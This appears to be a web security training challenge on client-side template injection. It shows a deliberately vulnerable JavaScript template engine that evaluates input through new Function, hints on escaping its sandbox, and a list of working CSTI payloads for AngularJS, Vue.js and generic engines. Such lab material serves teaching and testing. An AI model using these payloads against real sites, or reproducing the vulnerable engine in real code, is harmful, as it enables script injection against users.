Advanced #4: Client-Side Template Injection Hard

Objective

Execute alert('XSS') by exploiting a client-side template engine. The page uses {{ }} template delimiters to evaluate expressions. Inject a template expression that escapes the sandbox and runs arbitrary JavaScript.

Hints

The template engine evaluates expressions inside {{ }}. Try {{7*7}} — if it renders 49, the engine is evaluating your input as code. The engine provides access to a limited scope, but you can escape it.
Inside the template, this refers to the template context. But constructor gives you access to the Function constructor: {{constructor.constructor('return this')()}} gets you the global window object.
Try: {{constructor.constructor('alert(1)')()}} — This creates a new Function with your code and immediately calls it. Alternatively: {{this.alert('XSS')}} if the context has window access, or use the URL: ?greeting={{constructor.constructor('alert("XSS")')()}}

Vulnerable Code

// Simple template engine
function renderTemplate(tpl, ctx) {
  return tpl.replace(
    /\{\{(.+?)\}\}/g,
    (_, expr) => {
      try {
        return new Function(
          'ctx',
          'with(ctx){return ' + expr + '}'
        )(ctx);
      } catch(e) { return ''; }
    }
  );
}

Real-world context: Client-Side Template Injection (CSTI) affects frameworks like AngularJS ({{constructor.constructor('alert(1)')()}}), Vue.js (v-html), and custom template engines. If user input reaches a template expression context, the attacker can escape the sandbox and achieve XSS. AngularJS CSTI was a common HIGH-severity finding in bug bounty programs.

Common CSTI payloads:

  • AngularJS: {{constructor.constructor('alert(1)')()}}
  • Vue.js: {{_c.constructor('alert(1)')()}}
  • Generic: {{this.constructor.constructor('alert(1)')()}}
